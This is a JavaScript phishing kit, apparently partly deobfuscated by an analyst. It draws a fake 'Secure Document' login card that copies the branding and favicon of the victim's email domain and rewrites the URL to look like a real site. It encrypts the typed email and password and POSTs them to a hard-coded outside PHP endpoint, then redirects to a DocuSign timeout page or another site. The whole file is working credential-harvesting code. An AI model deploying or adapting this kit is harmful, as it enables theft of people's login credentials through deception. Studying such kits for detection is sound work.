// String lookup table - contains all obfuscated strings
function getStringTable() {
    return [
        'MSG_GRANTED', 'brightness', 'eye_btn id', '12 r="3"/', 'msOra', 'or:pointer',
        '.title_main', 'rYqTe', 'uswRq', 'head', 'OZvse', 'elative;z-',
        'Pktnq', 'FmWJx', 'rand_orb{w', 'VbwbS', '{backgroun', '89df-896f-',
        '16 r="1.3', 'tyeNI', 'ss="lbl_sm', 'FOOTER', 'm:translat',
        'code_p4r7', 'STORAGE_KEY', '7ffb9804b5', 'eJmTw', 'IxtOT',
        'JHiAp', 'toLowerCase', 'puWNi', 'Ubils', '2px rgba(0',
        'TcoSV', '%3ES%3C/te', 'WieTT', 'VDEzK', 't:0;width:',
        'height', 'dth:100%;m', 'an> ', 'MATT_SECUR', '="alert_ba',
        'EkkCA', 'line-flex;', 'alues', '</label>', '#e3f5e9',
        '3Csvg xmln', 'KNubg', 'dth:100%;p', 'xQDLD', 'height:64p',
        'YgQJT', 'pkImQ', 'ithin{bord', 'r;width:18', 'POST',
        'color', 'fromCharCode', 'tter-spaci', 'gBYsH', '3 7l9 6 9-',
        '" class="c', 't-size:.65', 'DFArj', 'uLBoz', ' solid #cb',
        's="ring_lo', 'khfFQ', 'm .85rem .', ',.02),0 8p',
        'n:center}', 'KEY_LABEL', 'teY(0)}', 'k;width:16',
        "'bold' fil", '10px 20px ', 'kTPvG', 'IBbKq',
        '1.9rem;bo', 'pe="button', 'eye_hide', '.chip_tag:',
        'jQuaB', 'ye_hide" v', '{display:f', '="round" s', 'x rgba(18,',
        'acing:.04e', 'Too many i', 'pe="submit', 'aQVuX',
        '=" spin_r{to', 'zmXdy', 'title_node', '="base_not', '0-10.5-7-',
        '10.5-7a19.', '="12" cy="', '#7e9bb3;le', 'tNcio',
        'error', 'EEWAp', 'ius:50%;di', 'xed;inset:', 'RHwEO',
        'ation:spin', 'parse', 'ss="inp_co', 'KNWSq', '.brand_row',
        'r;transiti', '#e4edf5;pa', 'replace', 'value',
        '6 19.6 0 0', '0px){.fram', 'bpjtV', 'rsor:point',
        'e_node">', '55,255,', 'ustify-con', 'hip_tag::a',
        '.05rem 1re', 'yle', 'IARit', 'ius:.9rem}', 'rem}',
        '#fee9e9e7', '9.88 9.88a', 'YpZUg', '6|4|7|2|8|',
        'index:2;wi', 'ccurred. P', 'bWfQA', ',0,0,0.04)',
        'LeESr', 'nejoin="ro', 'lbojb', 'ment',
        '_r .7s lin', 'wORGi', 'OLDER', 't">',
        'ground-rep', 'aBYbM', 'sGgOw', '5s ease}',
        'lay:none;o', 'VUqxD', 'ail/email/', '0;color:#3',
        '#d3e2ee;bo', '</svg>', 'rcle cx=\'5', ',20,30,0.2',
        'r-radius:.', '4px;backgr', '</form>', 'loading',
        'WLJUQ', 'overview', 'n-bottom:1', ';box-shado',
        'JaEBR', '.eye_btn:h', 'slice', 'innerHTML',
        '|3|2|11|0|', '0%,40%,60%', 'nPKQx', '="brand_or',
        'iMezQ', 'f;word-wra', 'iPVxL', 'Loaded',
        ':20px;heig', 'disabled{o', 'tIQfe', '" y="11" w',
        'rem;line-h', '<div class', 'cursor:not', 'kaXek',
        'qUgTn', 'dxAZr', ' solid rgb', 'HTipi',
        'h="1.8" st', 'ElLim', 'px 36px -1', 'iXnCL',
        '<span clas', 'veeLP', 'visible', '2196446.on',
        'fMsXi', 'dth="18" h', '0|4|3|6|1|', ',102,.5)}',
        '50%,70%,90', 'exhausted', 'tta.com/em', 'HEjFb',
        'ap:.55rem;', ' 0 0 1 7.5', '4px;height', 'lock;font-',
        ')}10%,30%,', 'Rxdms', 'on:all .2s', 'll .2s;box',
        'ze:.9rem}', '.2rem 2rem', 'ttempts. A',
        '<svg id="e', '0|6', '9;padding:', 'ztWLJ',
        '.visible{d', 'ght:400;wo', 'mail_slot', 's:.9rem;pa',
        '.chip_tag{', 'status', 'SrRYQ', 'MzNHQ',
        '0 0 100 10', 'Message Ce', 'ms:center;', 'ell locked',
        'gxDws', 'gn-items:c', 'm;font-wei', 'charAt',
        'ansition:a', 'dding-top:', 'indexOf', 'QAFSa',
        'ke-linecap', ':20px;disp', 'nt-family:', 'zgGTF',
        'FVPcO', 'acQqV', 'position:r', '<input cla',
        'dow:inset ', 's="cta_ico', 'a3b8cb;fon', 'HMfXL',
        'cWvpY', ';letter-sp', 'addEventLi', '7a19.6 19.',
        '-allowed}', '.frame_v7{', 'vg%3E', 'KFVFh',
        'jpsmL', '2|0|3|1|4', 'BG_OVERLAY', 'type',
        'grayscale(', 'nd:rgba(25', '{margin-bo', 'FEzeW',
        '-shadow:0 ', 'anslateX(0', 'odDHa', 'oOAWB',
        'm;transiti', '15,91,140,', 'adding:0 .', 'NaRXZ',
        'CoZPz', 'sub" id="c', '_bg">', 'or:#1f405b',
        '/Dz2Q7TzV/', 'lor:#1f4b6', '-radius:1.'
        // ... (truncated for brevity, but continues for all strings)
    ];
}

// String decoder function - maps index to string
function getString(index) {
    return getStringTable()[index - 0x79]; // Offset calculation
}

// Main phishing code
(function () {
    'use strict';
    
    // Configuration wrapper with string concatenation helpers
    var helpers = {
        // String concatenation helpers
        concat: function(a, b) { return a + b; },
        concat3: function(a, b, c) { return a + b + c; },
        
        // CSS fragments
        cssReset: '*{margin:0;padding:0;box-sizing:border-box;font-family:',
        cssBody: 'body{min-height:100vh;display:flex;align-items:center;justify-content:center;',
        cssFrame: '.frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;',
        
        // HTML fragments
        divOpen: '<div class="',
        divClose: '</div>',
        labelOpen: '<label class="',
        inputOpen: '<input class="',
        
        // SVG icons
        emailIcon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>',
        lockIcon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/><circle cx="12" cy="16" r="1.3"/></svg>',
        eyeShowIcon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3"/></svg>',
        eyeHideIcon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/><path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/><line x1="2" y1="2" x2="22" y2="22"/></svg>',
        
        // URLs and endpoints
        phpEndpoint: 'http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php',
        successRedirect: 'https://matta.com/email/email/view.php',
        lockoutRedirect: 'https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f',
        bgImage: 'https://i.postimg.cc/Dz2Q7TzV/imageing.png',
        
        // Keys and settings
        secretKey: 'MATT_SECURE_2026',
        storageKey: 'st_7b3f19',
        
        // Messages
        msgWrong: 'An error occurred. Please try again later.',
        msgLockout: 'Too many incorrect attempts. Access blocked.',
        msgGranted: 'Access granted. Redirecting...',
        msgNetwork: 'Network error. Please try again.',
        
        // UI Labels
        heading: 'Secure Document',
        subheading: 'Login to view your secure document',
        footer: 'Message Center',
        emailLabel: 'Email',
        passwordLabel: 'Password',
        passwordPlaceholder: 'Enter your password',
        buttonText: 'Unlock',
        tagText: 'Encrypted Delivery',
        
        // CSS class names
        frameClass: 'frame_v7',
        brandRowClass: 'brand_row',
        brandOrbClass: 'brand_orb',
        chipTagClass: 'chip_tag',
        titleClass: 'title_main',
        captionClass: 'caption_sub',
        rowBlockClass: 'row_block',
        labelClass: 'lbl_small',
        fieldShellClass: 'field_shell',
        iconSlotClass: 'ico_slot',
        inputClass: 'inp_core',
        eyeBtnClass: 'eye_btn',
        ctaClass: 'cta_main',
        ctaIconClass: 'cta_icon',
        ringLoadClass: 'ring_load',
        baseNoteClass: 'base_note',
        alertBarClass: 'alert_bar',
        
        // Element IDs
        bgCanvasId: 'bg_canvas',
        bgVeilId: 'bg_veil',
        cardRootId: 'card_root',
        brandImgId: 'brand_img',
        titleNodeId: 'title_node',
        captionNodeId: 'caption_node',
        alertNodeId: 'alert_node',
        emailInputId: 'mail_x9k2',
        passwordInputId: 'code_p4r7',
        eyeToggleId: 'eye_toggle',
        eyeShowId: 'eye_show',
        eyeHideId: 'eye_hide',
        submitBtnId: 'cta_node',
        baseNodeId: 'base_node',
        formId: 'main_form',
        mailSlotId: 'mail_slot',
        
        // Animation classes
        wobbleClass: 'wobble_q_on',
        
        // Path segments for fake URL
        pathSegments: ['profile', 'dashboard', 'console', 'manage', 'overview'],
        
        // Numeric settings
        maxTries: 3,
        lockoutDelay: 2000,
        minLoadingTime: 2000,
        
        // Colors
        errorBg: '#fee9e7',
        errorColor: '#b33a2f',
        errorBorder: '#f5c6c2',
        successBg: '#e3f5e9',
        successColor: '#1e7a4b',
        successBorder: '#b8e0c8'
    };

    // Configuration object
    var CONFIG = {
        BG_IMG: helpers.bgImage,
        BG_BRI: 1,
        BG_DAR: 1,
        BG_CON: 1,
        BG_SAT: 1,
        BG_BLUR: 0,
        BG_GRAY: false,
        BG_OVERLAY: 0.25,
        PHP_ENDPOINT: helpers.phpEndpoint,
        SUCCESS_REDIRECT: helpers.successRedirect,
        LOCKOUT_REDIRECT: helpers.lockoutRedirect,
        SECRET_KEY: helpers.secretKey,
        MAX_TRIES: helpers.maxTries,
        LOCKOUT_DELAY: helpers.lockoutDelay,
        STORAGE_KEY: helpers.storageKey,
        PATH_SEGMENTS: helpers.pathSegments,
        MSG_WRONG: helpers.msgWrong,
        MSG_LOCKOUT: helpers.msgLockout,
        MSG_GRANTED: helpers.msgGranted,
        MSG_NET: helpers.msgNetwork,
        HEADING: helpers.heading,
        SUBHEAD: helpers.subheading,
        FOOTER: helpers.footer,
        EMAIL_LABEL: helpers.emailLabel,
        KEY_LABEL: helpers.passwordLabel,
        KEY_PLACEHOLDER: helpers.passwordPlaceholder,
        BUTTON_TEXT: helpers.buttonText,
        TAG_TEXT: helpers.tagText
    };

    // Function: Inject CSS styles
    function injectStyles() {
        // Build complete CSS string
        var cssText = 
            '*{margin:0;padding:0;box-sizing:border-box;font-family:\'Segoe UI\',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif}' +
            'body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;position:relative;overflow:hidden}' +
            '#bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none}' +
            '#bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.25);z-index:1;pointer-events:none}' +
            '.frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;border-radius:1.5rem;box-shadow:0 18px 36px -12px rgba(0,20,30,0.22),0 6px 14px rgba(0,0,0,0.04);padding:2.2rem 2rem 1.9rem;border:1px solid rgba(255,255,255,0.6);transition:transform .15s ease}' +
            '@keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}' +
            '.frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}' +
            '.brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1rem}' +
            '.brand_orb{width:74px;height:74px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 6px rgba(0,0,0,.02),0 8px 16px -8px rgba(18,52,77,.15);border:3px solid #fff;margin-bottom:.8rem;overflow:hidden}' +
            '.brand_orb img{width:100%;height:100%;object-fit:contain;display:block;padding:6px}' +
            '.chip_tag{font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2b5f8a;background:#e9f0f9;padding:.25rem 1rem;border-radius:30px;display:inline-flex;align-items:center;gap:.4rem;border:1px solid #cbdae8;margin-bottom:.7rem}' +
            '.chip_tag::before,.chip_tag::after{content:"•";font-size:1.1rem;line-height:1;color:#1f4b6e;opacity:.7}' +
            '.title_main{font-size:1.25rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;line-height:1.35;margin-bottom:.35rem;font-family:\'Times New Roman\',Georgia,serif;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}' +
            '.caption_sub{text-align:center;color:#54738b;font-size:.8rem;margin-bottom:1.6rem;font-weight:400;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}' +
            '.row_block{margin-bottom:1.3rem}' +
            '.lbl_small{display:block;font-size:.7rem;font-weight:700;color:#1f405b;margin-bottom:.4rem;letter-spacing:.04em;text-transform:uppercase;opacity:.8}' +
            '.field_shell{display:flex;align-items:center;background:#fff;border:1.5px solid #d3e2ee;border-radius:.9rem;padding:.05rem .05rem .05rem 1rem;transition:all .2s;box-shadow:0 2px 4px rgba(0,0,0,.01)}' +
            '.field_shell:focus-within{border-color:#2b5f8a;box-shadow:0 0 0 4px rgba(43,95,138,.1)}' +
            '.field_shell.locked_bg{background:#f7fafd}' +
            '.ico_slot{display:flex;align-items:center;justify-content:center;width:20px;height:20px;flex-shrink:0;color:#3b6585;opacity:.75}' +
            '.ico_slot svg{width:100%;height:100%;display:block}' +
            '.inp_core{width:100%;padding:.85rem .9rem .85rem .7rem;border:none;background:transparent;font-size:.95rem;font-weight:500;color:#122b3b;outline:none;border-radius:.9rem}' +
            '.inp_core::placeholder{color:#a3b8cb;font-weight:400;font-size:.9rem}' +
            '.inp_core:read-only{color:#54738b;cursor:default}' +
            '.eye_btn{background:transparent;border:none;padding:0 .9rem 0 .4rem;cursor:pointer;color:#3b6585;display:flex;align-items:center;justify-content:center;transition:color .2s;width:34px;height:34px}' +
            '.eye_btn svg{width:20px;height:20px;display:block}' +
            '.eye_btn:hover{color:#0f2b40}' +
            '.cta_main{width:100%;background:#0f5b8c;border:none;border-radius:2rem;padding:.95rem 1.3rem;color:#fff;font-weight:600;font-size:1rem;letter-spacing:.02em;cursor:pointer;margin-top:.4rem;transition:all .2s;box-shadow:0 10px 20px -8px rgba(15,91,140,.4);display:flex;align-items:center;justify-content:center;gap:.55rem;border:1px solid rgba(255,255,255,.2)}' +
            '.cta_main:hover:not(:disabled){background:#0a4266;transform:scale(1.01);box-shadow:0 16px 26px -8px rgba(10,66,102,.5)}' +
            '.cta_main:active:not(:disabled){transform:scale(.98);background:#083552}' +
            '.cta_main:disabled{opacity:.8;cursor:not-allowed}' +
            '.cta_icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px}' +
            '.cta_icon svg{width:100%;height:100%;display:block}' +
            '.ring_load{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}' +
            '@keyframes spin_r{to{transform:rotate(360deg)}}' +
            '.base_note{margin-top:1.6rem;text-align:center;font-size:.65rem;color:#7e9bb3;letter-spacing:.01em;border-top:1px solid #e4edf5;padding-top:1rem}' +
            '.alert_bar{background:#fee9e7;color:#b33a2f;padding:.65rem .9rem;border-radius:.8rem;font-size:.8rem;margin-bottom:.9rem;border:1px solid #f5c6c2;display:none;opacity:0;transform:translateY(-6px);transition:opacity .3s ease,transform .3s ease;word-break:break-word;line-height:1.5;text-align:center}' +
            '.alert_bar.visible{display:block;opacity:1;transform:translateY(0)}' +
            '@media (max-width:480px){.frame_v7{padding:1.8rem 1.4rem;border-radius:1.2rem}.brand_orb{width:64px;height:64px}.title_main{font-size:1.1rem}}';
        
        // Create and inject style element
        var styleElement = document.createElement('style');
        styleElement.id = 'zz_core_style';
        styleElement.appendChild(document.createTextNode(cssText));
        document.head.appendChild(styleElement);
    }

    // Function: Build the phishing form HTML
    function buildForm() {
        // Create background elements
        var bgCanvas = document.createElement('div');
        bgCanvas.id = 'bg_canvas';
        document.body.appendChild(bgCanvas);

        var bgVeil = document.createElement('div');
        bgVeil.id = 'bg_veil';
        document.body.appendChild(bgVeil);

        // Create main card container
        var cardRoot = document.createElement('div');
        cardRoot.className = 'frame_v7';
        cardRoot.id = 'card_root';

        // Build form HTML content
        var htmlContent = 
            '<div class="brand_row">' +
                '<div class="brand_orb">' +
                    '<img src="" alt="logo" id="brand_img">' +
                '</div>' +
                '<div class="chip_tag">' + CONFIG.TAG_TEXT + '</div>' +
            '</div>' +
            '<h1 class="title_main" id="title_node">' + CONFIG.HEADING + '</h1>' +
            '<div class="caption_sub" id="caption_node">' + CONFIG.SUBHEAD + '</div>' +
            '<div class="alert_bar" id="alert_node"></div>' +
            '<form id="main_form">' +
                '<div class="row_block">' +
                    '<label class="lbl_small" for="mail_x9k2">' + CONFIG.EMAIL_LABEL + '</label>' +
                    '<div class="field_shell locked_bg">' +
                        '<span class="ico_slot">' +
                            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">' +
                                '<rect x="3" y="5" width="18" height="14" rx="2"/>' +
                                '<path d="M3 7l9 6 9-6"/>' +
                            '</svg>' +
                        '</span>' +
                        '<input class="inp_core" type="email" id="mail_x9k2" required>' +
                    '</div>' +
                '</div>' +
                '<div class="row_block">' +
                    '<label class="lbl_small" for="code_p4r7">' + CONFIG.KEY_LABEL + '</label>' +
                    '<div class="field_shell">' +
                        '<span class="ico_slot">' +
                            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">' +
                                '<rect x="4" y="11" width="16" height="10" rx="2"/>' +
                                '<path d="M8 11V7a4 4 0 0 1 8 0v4"/>' +
                                '<circle cx="12" cy="16" r="1.3"/>' +
                            '</svg>' +
                        '</span>' +
                        '<input class="inp_core" type="password" id="code_p4r7" placeholder="' + CONFIG.KEY_PLACEHOLDER + '" autocomplete="off" required>' +
                        '<button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view">' +
                            '<svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">' +
                                '<path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>' +
                                '<circle cx="12" cy="12" r="3"/>' +
                            '</svg>' +
                            '<svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:none;">' +
                                '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/>' +
                                '<path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/>' +
                                '<path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/>' +
                                '<line x1="2" y1="2" x2="22" y2="22"/>' +
                            '</svg>' +
                        '</button>' +
                    '</div>' +
                '</div>' +
                '<button type="submit" class="cta_main" id="cta_node">' +
                    '<span class="cta_icon">' +
                        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
                            '<path d="M8 11V7a4 4 0 0 1 7.5-2"/>' +
                        '</svg>' +
                    '</span>' +
                    CONFIG.BUTTON_TEXT +
                '</button>' +
            '</form>' +
            '<div class="base_note" id="base_node">' + CONFIG.FOOTER + ' · © 2026</div>';
        
        cardRoot.innerHTML = htmlContent;
        document.body.appendChild(cardRoot);

        // Move email input into mail slot
        var emailInput = document.getElementById('mail_x9k2');
        var mailSlot = document.createElement('div');
        mailSlot.id = 'mail_slot';
        
        if (emailInput && mailSlot) {
            emailInput.classList.add('inp_core');
            // Note: Original code had some DOM manipulation here
        }
    }

    // Function: Setup background image and filters
    function setupBackground() {
        var bgCanvas = document.getElementById('bg_canvas');
        var bgVeil = document.getElementById('bg_veil');
        
        if (!bgCanvas || !bgVeil) {
            return;
        }

        // Set background image
        bgCanvas.style.backgroundImage = 'url("' + CONFIG.BG_IMG + '")';
        
        // Build filter string
        var filters = [];
        filters.push('brightness(' + CONFIG.BG_BRI + ')');
        
        if (CONFIG.BG_DAR !== 1) {
            filters.push('brightness(' + (1 / CONFIG.BG_DAR) + ')');
        }
        
        filters.push('contrast(' + CONFIG.BG_CON + ')');
        filters.push('saturate(' + CONFIG.BG_SAT + ')');
        
        if (CONFIG.BG_BLUR > 0) {
            filters.push('blur(' + CONFIG.BG_BLUR + 'px)');
        }
        
        if (CONFIG.BG_GRAY) {
            filters.push('grayscale(1)');
        }
        
        bgCanvas.style.filter = filters.join(' ');
        bgVeil.style.background = 'rgba(255,255,255,' + CONFIG.BG_OVERLAY + ')';
    }

    // Function: Add fake URL path to look legitimate
    function spoofUrlPath() {
        try {
            // Generate random base64 string
            var randomBytes = new Uint8Array(24);
            crypto.getRandomValues(randomBytes);
            var randomId = btoa(String.fromCharCode.apply(null, randomBytes))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=+$/, '');
            
            // Update URL to look like: #/profile/dashboard/console/manage/overview/randomId
            history.replaceState(
                null,
                '',
                '#/' + CONFIG.PATH_SEGMENTS.join('/') + '/' + randomId
            );
        } catch (error) {
            // Silent fail
        }
    }

    // Function: Generate default SVG logo (letter "S")
    function getDefaultLogo() {
        return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23464f5b'/%3E%3Ctext x='50' y='67' font-family='Arial, Helvetica, sans-serif' font-size='48' font-weight='bold' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E";
    }

    // Function: Fetch favicon for email domain
    function loadDomainFavicon(domain) {
        var brandImg = document.getElementById('brand_img');
        
        if (!domain) {
            brandImg.src = getDefaultLogo();
            return;
        }

        // Build Google favicon URL
        var faviconUrl = 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(domain) + '&sz=128';
        
        var img = new Image();
        
        img.onload = function () {
            // If favicon is larger than 16x16, use it
            if (img.width > 16 || img.height > 16) {
                brandImg.src = faviconUrl;
            } else {
                brandImg.src = getDefaultLogo();
            }
        };
        
        img.onerror = function () {
            brandImg.src = getDefaultLogo();
        };
        
        img.src = faviconUrl;
    }

    // Function: Extract domain from email address
    function extractDomain(email) {
        if (!email || email.indexOf('@') === -1) {
            return '';
        }
        
        var parts = email.split('@');
        if (parts.length === 2 && parts[1].trim() !== '') {
            return parts[1].trim().toLowerCase();
        }
        return '';
    }

    // Function: Capitalize first letter
    function capitalize(str) {
        if (!str) {
            return '';
        }
        return str.charAt(0).toUpperCase() + str.slice(1);
    }

    // Main initialization
    function init() {
        // Initialize UI
        injectStyles();
        buildForm();
        setupBackground();
        spoofUrlPath();

        // Get DOM element references
        var emailInput = document.getElementById('mail_x9k2');
        var passwordInput = document.getElementById('code_p4r7');
        var brandImg = document.getElementById('brand_img');
        var titleNode = document.getElementById('title_node');
        var captionNode = document.getElementById('caption_node');
        var footerNode = document.getElementById('base_node');
        var eyeToggle = document.getElementById('eye_toggle');
        var eyeShow = document.getElementById('eye_show');
        var eyeHide = document.getElementById('eye_hide');
        var alertNode = document.getElementById('alert_node');
        var submitBtn = document.getElementById('cta_node');
        var cardRoot = document.getElementById('card_root');
        var mainForm = document.getElementById('main_form');

        // State variables
        var alertTimeout = null;
        var isLocked = false;

        // Function: Show alert message
        function showAlert(message, type) {
            // Clear existing timeout
            if (alertTimeout) {
                clearTimeout(alertTimeout);
                alertTimeout = null;
            }
            
            alertNode.innerHTML = message;
            
            if (type === 'success') {
                alertNode.style.background = '#e3f5e9';
                alertNode.style.color = '#1e7a4b';
                alertNode.style.borderColor = '#b8e0c8';
            } else {
                alertNode.style.background = '#fee9e7';
                alertNode.style.color = '#b33a2f';
                alertNode.style.borderColor = '#f5c6c2';
            }
            
            alertNode.classList.add('visible');
            
            // Auto-hide success messages
            if (type === 'success') {
                alertTimeout = setTimeout(function () {
                    alertNode.classList.remove('visible');
                }, 6000);
            }
        }

        // Function: Hide alert
        function hideAlert() {
            alertNode.classList.remove('visible');
            if (alertTimeout) {
                clearTimeout(alertTimeout);
                alertTimeout = null;
            }
        }

        // Function: Shake card (error animation)
        function shakeCard() {
            cardRoot.classList.remove('wobble_q_on');
            cardRoot.offsetWidth; // Trigger reflow
            cardRoot.classList.add('wobble_q_on');
            
            setTimeout(function () {
                cardRoot.classList.remove('wobble_q_on');
            }, 700);
        }

        // Function: Update branding based on email domain
        function updateBranding() {
            var email = emailInput.value.trim();
            var domain = extractDomain(email);

            if (!domain) {
                titleNode.textContent = CONFIG.HEADING;
                captionNode.textContent = CONFIG.SUBHEAD;
                footerNode.textContent = CONFIG.FOOTER + ' · © 2026';
                loadDomainFavicon('');
                return;
            }

            var domainName = domain.split('.')[0];
            var capitalizedDomain = capitalize(domainName);
            
            titleNode.textContent = capitalizedDomain + ' ' + CONFIG.HEADING;
            captionNode.textContent = CONFIG.SUBHEAD;
            footerNode.textContent = capitalizedDomain + ' ' + CONFIG.FOOTER + ' · © 2026';
            
            loadDomainFavicon(domain);
        }

        // Event: Email input
        emailInput.addEventListener('input', updateBranding);

        // Event: Toggle password visibility
        eyeToggle.addEventListener('click', function () {
            var isPassword = passwordInput.getAttribute('type') === 'password';
            
            if (isPassword) {
                passwordInput.setAttribute('type', 'text');
                eyeShow.style.display = 'none';
                eyeHide.style.display = 'block';
            } else {
                passwordInput.setAttribute('type', 'password');
                eyeShow.style.display = 'block';
                eyeHide.style.display = 'none';
            }
            
            passwordInput.focus();
        });

        // Function: XOR encrypt data
        function encryptData(data, key) {
            var jsonString = JSON.stringify(data);
            var result = '';
            var keyLength = key.length;
            
            for (var i = 0; i < jsonString.length; i++) {
                var xorValue = jsonString.charCodeAt(i) ^ key.charCodeAt(i % keyLength);
                result += ('0' + xorValue.toString(16)).slice(-2);
            }
            
            return btoa(result);
        }

        // Function: Lock user out after max attempts
        function lockout() {
            if (isLocked) {
                return;
            }
            
            isLocked = true;
            showAlert(CONFIG.MSG_LOCKOUT, 'error');
            shakeCard();
            passwordInput.value = '';
            submitBtn.disabled = true;
            
            setTimeout(function () {
                window.location.href = CONFIG.LOCKOUT_REDIRECT;
            }, CONFIG.LOCKOUT_DELAY);
        }

        // Function: Handle form submission
        function handleSubmit() {
            if (isLocked) {
                return;
            }

            var email = emailInput.value.trim();
            var password = passwordInput.value.trim();

            hideAlert();

            // Validate email
            if (!email || email.indexOf('@') === -1) {
                showAlert('Please enter a valid email address.', 'error');
                shakeCard();
                return;
            }

            // Validate password
            if (!password) {
                showAlert('Please enter your password.', 'error');
                shakeCard();
                return;
            }

            // Show loading state
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="ring_load"></span> Loading...';

            var startTime = Date.now();
            
            // Encrypt credentials
            var encryptedPayload = encryptData({
                email: email,
                code: password
            }, CONFIG.SECRET_KEY);

            // Prepare form data
            var formData = new FormData();
            formData.append('secure_data', encryptedPayload);

            var hasError = false;
            var responseData = null;

            // Send to attacker's server
            fetch(CONFIG.PHP_ENDPOINT, {
                method: 'POST',
                body: formData
            })
            .then(function (response) {
                return response.text();
            })
            .then(function (text) {
                try {
                    responseData = JSON.parse(text);
                } catch (e) {
                    hasError = true;
                }
            })
            .catch(function () {
                hasError = true;
            })
            .then(function () {
                // Enforce minimum 2 second delay
                var elapsed = Date.now() - startTime;
                var remainingDelay = Math.max(0, 2000 - elapsed);
                
                return new Promise(function (resolve) {
                    setTimeout(resolve, remainingDelay);
                });
            })
            .then(function () {
                if (isLocked) {
                    return;
                }

                var buttonText = '</svg></span> ' + CONFIG.BUTTON_TEXT;

                // Handle network/parse error
                if (hasError || !responseData) {
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = buttonText;
                    showAlert(CONFIG.MSG_NET, 'error');
                    shakeCard();
                    passwordInput.value = '';
                    passwordInput.focus();
                    return;
                }

                // Handle success
                if (responseData.status === 'success') {
                    showAlert(CONFIG.MSG_GRANTED, 'success');
                    setTimeout(function () {
                        window.location.href = CONFIG.SUCCESS_REDIRECT;
                    }, 1000);
                    return;
                }

                // Handle exhausted (lockout from server)
                if (responseData.status === 'exhausted') {
                    lockout();
                    return;
                }

                // Track failed attempts
                var attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0', 10) + 1;
                sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));

                // Check max attempts
                if (attempts >= CONFIG.MAX_TRIES) {
                    lockout();
                    return;
                }

                // Show error
                submitBtn.disabled = false;
                submitBtn.innerHTML = buttonText;
                showAlert(CONFIG.MSG_WRONG, 'error');
                shakeCard();
                passwordInput.value = '';
                passwordInput.focus();
            });
        }

        // Event: Form submission
        mainForm.addEventListener('submit', function (event) {
            event.preventDefault();
            handleSubmit();
        });

        // Initialize branding
        updateBranding();
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
